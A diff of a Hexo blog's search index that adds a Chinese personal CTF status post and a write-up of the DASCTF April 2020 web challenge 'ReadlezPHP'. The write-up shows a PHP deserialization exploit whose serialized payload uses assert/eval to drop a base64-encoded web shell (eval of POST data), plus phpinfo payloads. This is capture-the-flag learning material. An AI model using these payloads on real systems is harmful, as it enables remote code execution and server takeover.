@@ -1,6 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>近期总结</title>
+    <url>/2020/05/08/36Dcup/</url>
+    <content><![CDATA[<p>前几天出去玩了，ISCC、36D、De1都是打了一部分就没打了，毕竟五一嘛，还是要出去开心一下的</p>
+<p>而且这几天事情虽然不多，但是有些学习上的乱七八糟的事情，闲下来也不想好好复盘，就知道快乐LOL。。</p>
+<p>刚才尝试复盘了一下NPU的web，不得不说有点自闭，还是太菜了。</p>
+<p>36D先开着，除去一些变态的misc和web我都会复盘的，但是在这之前我要把拖了N周的信号作业看上一看。</p>
+<p>等明晚，肯定开搞，毕竟网鼎要来了，不能太拉后腿。（还是先从1分web刷起吧，近期嘴上说的萌新赛的比赛都是假的。气死👴了！</p>
+<hr>
+<p>我还是没更了</p>
+<p>现在网鼎已经打完了，misc还是毫无人性，不过总体还是可以</p>
+<p>昨晚把aa要的题目出完了，dockerfile嫖的nj师傅的，出了个简单的文件包含和备份</p>
+<p>在测试部署题目的时候也学会了关于docker的很多东西</p>
+<p>dockerfile大致能看懂怎么写了，会部署了，版本问题和权限控制也会了一些，也认识了docker打包</p>
+<p>等啥时候能给安恒出web的时候，写篇详细的docker出题过程</p>
+<p>还有就是，以后打算题目不按照比赛写了</p>
+<p>一大块一大块的要一次性写的内容太多，没有创作动力和大块时间</p>
+<p>以后一篇写一道就好了，misc和web都写</p>
+<p>近期状态要赶紧调整了，每晚无意义的晚睡，白天听课时无意义的忙碌，既没有学到课本上的知识也没有学到比赛知识，而且可能快要开学或是考试了，要认真学学书本知识了，落的课太多了。。</p>
+<p>早睡，认真听课，认真刷题，好好复习！冲冲冲</p>
+]]></content>
+      <categories>
+        <category>Write_up</category>
+      </categories>
+      <tags>
+        <tag>Write_up</tag>
+        <tag>misc</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DASCTF_2020_April</title>
     <url>/2020/04/25/DASCTF-2020-April/</url>
     <content><![CDATA[<p>虽然有一堆作业和ppt还没做，但是俯冲完中期报告还是有个闲适期的，然后就看比赛、多人运动（开黑）了，也复盘了一部分极客大挑战吧。还好今天安恒有个月赛玩，就来水一水。随便写点wp，也纪念一下我妹的生日（第一次在家一起过，不过好像跟平常的日子没啥子区别，哈哈。）然后的话，后面几天就把作业和两个项目ppt搞搞，顺便期待一下明天IG大战TES。</p>
@@ -92,9 +122,24 @@
 <p>RECYCLER文件夹里面也有flag文件夹，但是那个套娃最后的图片拼到一起看不出来。。</p>
 <p>看wp，发现win7系统默认的桌面图片都放在<code>C:\WINDOWS\Web\Wallpaper</code> 里面，得到<code>Flag.png</code>。</p>
 <p>改个后缀或者cat一下都可以得到flag</p>
-<h3 id="剩下的题"><a href="#剩下的题" class="headerlink" title="剩下的题"></a>剩下的题</h3><p>MC（红石电路的常亮和短亮转二进制、二进制转ASCII、ASCII用md5加密即可）、刻在DNA的撤硕儿（偏逆向，要读代码，不会喽）</p>
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>有时间就复盘</p>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>这个做了两道最简单的，一个日历、一个atbash，wp也可以直接搜到</p>
+<h3 id="剩下的Misc题"><a href="#剩下的Misc题" class="headerlink" title="剩下的Misc题"></a>剩下的Misc题</h3><p>MC（红石电路的常亮和短亮转二进制、二进制转ASCII、ASCII用md5加密即可）、刻在DNA的撤硕儿（偏逆向，要读代码，不会喽）</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h3><p>考点：反序列化</p>
+<p>查看源代码发现<code>./time.php?source</code>，访问后得到源码</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure></div>
+
+<p>通过<code>echo $b($a);</code>来执行命令，system、exec等函数被过滤（这也不可能放呀，要不简单多了。</p>
+<p>思路1：<code>assert()</code>将整个字符串参数当作php执行，详见<a href="https://www.php.net/assert/" target="_blank" rel="noopener">1</a></p>
+<p>构造如下：</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">'eval("file_put_contents(\'1.php\', base64_decode(\'PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==\'));")'</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">'assert'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">86</span>:<span class="string">"eval("</span>file_put_contents(<span class="string">'1.php'</span>, base64_decode(<span class="string">'PD9waHAgZXZhbCgkX1BPU1RbMV0pOw=='</span>));<span class="string">")"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;&#125;</span><br><span class="line"><span class="comment">//蚁剑连上之后啥也没有。。拿插件绕过disable_functions之后根目录还是假flag。不过也可以在蚁剑上打开phpinfo</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">"phpinfo()"</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">"assert"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">9</span>:<span class="string">"phpinfo()"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>思路2：<code>call_user_func()</code> 把第一个参数作为回调函数调用，详见<a href="https://www.php.net/call_user_func/" target="_blank" rel="noopener">2</a></p>
+<p>构造如下：</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">"phpinfo"</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">"call_user_func"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">O:<span class="number">8</span>:<span class="string">"HelloPhp"</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">"a"</span>;s:<span class="number">7</span>:<span class="string">"phpinfo"</span>;s:<span class="number">1</span>:<span class="string">"b"</span>;s:<span class="number">14</span>:<span class="string">"call_user_func"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag：（有、骚放phpinfo里</p>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:60%;" data-src="/2020/04/22/NPUCTF-2020/2.png" src="/img/loading.gif" class="lazyload"></a>
+
+<h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>这个做了两道最简单的，一个日历、一个atbash，wp可以直接搜到</p>
 ]]></content>
       <categories>
         <category>Write_up</category>
@@ -102,6 +147,7 @@
       <tags>
         <tag>Write_up</tag>
         <tag>misc</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
